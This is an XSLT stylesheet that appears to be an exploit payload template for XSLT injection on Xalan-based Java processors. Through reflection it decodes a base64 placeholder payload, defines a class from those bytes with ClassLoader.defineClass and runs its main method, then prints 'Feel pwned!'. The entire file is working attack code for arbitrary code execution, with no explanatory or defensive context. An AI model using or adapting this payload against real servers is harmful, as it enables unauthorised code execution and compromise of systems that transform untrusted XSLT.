<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:j="http://xml.apache.org/xalan/java" exclude-result-prefixes="j">
<xsl:template match="/"> 
<xsl:variable name="data">${[BASE64PAYLOAD]}</xsl:variable>
<xsl:variable name="n" select="j:get(j:java.util.HashMap.new(),'')"/>
<xsl:variable name="c1" select="j:getInterfaces(j:java.lang.Class.forName('java.lang.Number'))"/>  	
<xsl:variable name="c2" select="j:getInterfaces(j:java.lang.Class.forName('java.io.File'))"/>
<xsl:variable name="c3" select="j:getInterfaces(j:java.lang.Class.forName('java.util.Hashtable'))"/>
<xsl:variable name="l" select="j:java.util.ArrayList.new()"/>
<xsl:value-of select="substring(j:add($l,j:java.lang.reflect.Array.newInstance(j:java.lang.Class.forName('java.net.URL'),0)),5)"/>
<xsl:value-of select="j:java.lang.reflect.Array.set($c1,0,j:java.lang.Class.forName('[Ljava.net.URL;'))"/>
<xsl:variable name="r" select="j:newInstance(j:getConstructor(j:java.lang.Class.forName('java.net.URLClassLoader'),$c1),j:toArray($l))"/>
<xsl:value-of select="j:java.lang.reflect.Array.set($c3,0,j:java.lang.Class.forName('java.lang.String'))"/>
<xsl:value-of select="j:java.lang.reflect.Array.set($c3,1,j:java.lang.Class.forName('java.nio.ByteBuffer'))"/>
<xsl:value-of select="j:java.lang.reflect.Array.set($c3,2,j:java.lang.Class.forName('java.security.ProtectionDomain'))"/>
<xsl:variable name="m" select="j:getDeclaredMethod(j:java.lang.Class.forName('java.lang.ClassLoader'),'defineClass',$c3)"/>
<xsl:value-of select="j:setAccessible($m,true())"/>
<xsl:value-of select="j:clear($l)"/>
<xsl:value-of select="substring(j:add($l,$n),5)"/>
<xsl:value-of select="substring(j:add($l,j:java.nio.ByteBuffer.wrap(j:decodeBuffer(j:sun.misc.BASE64Decoder.new(),$data))),1,0)"/>
<xsl:value-of select="substring(j:add($l,$n),5)"/>
<xsl:variable name="z" select="j:invoke($m, $r, j:toArray($l))"/>
<xsl:value-of select="j:java.lang.reflect.Array.set($c1,0,j:java.lang.Class.forName('[Ljava.lang.String;'))"/>
<xsl:value-of select="j:java.lang.reflect.Array.set($c2,0,j:java.lang.Class.forName('java.lang.String'))"/>
<xsl:value-of select="j:java.lang.reflect.Array.set($c2,1,j:java.lang.Class.forName('[Ljava.lang.Class;'))"/>
<xsl:value-of select="j:clear($l)"/>
<xsl:value-of select="substring(j:add($l,'main'),5)"/>
<xsl:value-of select="substring(j:add($l,$c1),5)"/>
<xsl:variable name="v" select="j:invoke(j:getMethod(j:java.lang.Class.forName('java.lang.Class'),'getMethod',$c2),$z,j:toArray($l))"/>
<xsl:value-of select="j:java.lang.reflect.Array.set($c2,0,j:java.lang.Class.forName('java.lang.Object'))"/>
<xsl:value-of select="j:java.lang.reflect.Array.set($c2,1,j:java.lang.Class.forName('[Ljava.lang.Object;'))"/>
<xsl:value-of select="j:clear($l)"/>
<xsl:value-of select="substring(j:add($l,j:java.lang.reflect.Array.newInstance(j:java.lang.Class.forName('java.lang.String'),0)),5)"/>
<xsl:value-of select="substring(j:set($l,0,j:toArray($l)),1,0)"/>
<xsl:value-of select="j:add($l,0,$n)"/>
<xsl:value-of select="j:invoke(j:getMethod(j:java.lang.Class.forName('java.lang.reflect.Method'),'invoke',$c2),$v,j:toArray($l))"/> 
<result>Feel pwned!</result>
</xsl:template>
</xsl:stylesheet>